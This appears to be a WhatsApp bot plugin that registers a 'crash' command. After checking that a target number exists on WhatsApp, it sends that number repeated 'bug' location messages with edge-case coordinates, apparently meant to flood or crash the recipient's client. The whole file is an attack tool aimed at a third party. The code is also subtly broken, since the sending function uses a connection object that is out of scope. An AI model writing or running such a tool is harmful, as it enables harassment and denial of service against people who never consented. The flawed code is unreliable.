let handler = async (m, { conn, text, usedPrefix, command, isOwner }) => {
  // Restrict command to bot owner
  if (!isOwner) {
    return m.reply("❌ This command is restricted to the bot owner.");
  }

  // Validate input
  if (!text || !text.includes(",")) {
    return m.reply(`⚠️ Invalid input!\nExample: *${usedPrefix + command} 2773,10*`);
  }

  // Parse target number and bug count
  let [target, count] = text.split(",").map((item) => item.trim());
  target = target.replace(/[^0-9]/g, ""); // Remove non-numeric characters
  count = parseInt(count);

  // Validate parsed data
  if (!target || isNaN(target)) {
    return m.reply("❌ Invalid target number.");
  }
  if (!count || isNaN(count)) {
    return m.reply("❌ Invalid number of bugs.");
  }

  // Check if target exists on WhatsApp
  const org = `${target}@s.whatsapp.net`;
  const check = await conn.onWhatsApp(target);
  if (!check || !check[0]?.exists) {
    return m.reply("❌ Target is not registered on WhatsApp.");
  }

  // Notify process start
  await m.reply("🔄 Processing bug submissions...");

  try {
    const totalBugs = count + 10;

    // Send bug messages
    for (let i = 0; i < totalBugs; i++) {
      if (i === 10) {
        await m.reply(`✅ Successfully processed. Bugs are being sent to ${target}.`);
      }

      // Send Location Bug
      await MessageBug(org);

      // Wait 2 seconds between each message to avoid overloading
      await sleep(2000);
    }

    // Notify process completion
    await m.reply("✅ All bugs have been successfully sent!");
  } catch (error) {
    // Handle errors gracefully
    console.error(error);
    m.reply(`❌ An error occurred while processing the command: ${error.message}`);
  }
};

// Sleep function for delay
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Location Bug Function
const MessageBug = async (target) => {
  try {
    await conn.sendMessage(
      target,
      {
        location: {
          degreesLatitude: 0.0, // Example: Invalid or edge-case coordinates
          degreesLongitude: 0.0, // You can adjust to unusual coordinates
          address: "🌍 Unexpected Location Bug",
          name: "lazack device Test",
        },
        caption: "🌀 Location Bug Sent! 🚨",
      },
      { quoted: null } // Optional: Reference message
    );
  } catch (error) {
    console.error(`Error sending location bug to ${target}:`, error.message);
  }
};

// Metadata for the command
handler.help = ["crash"];
handler.tags = ["tools"];
handler.command = /^(crash)$/i;

export default handler;
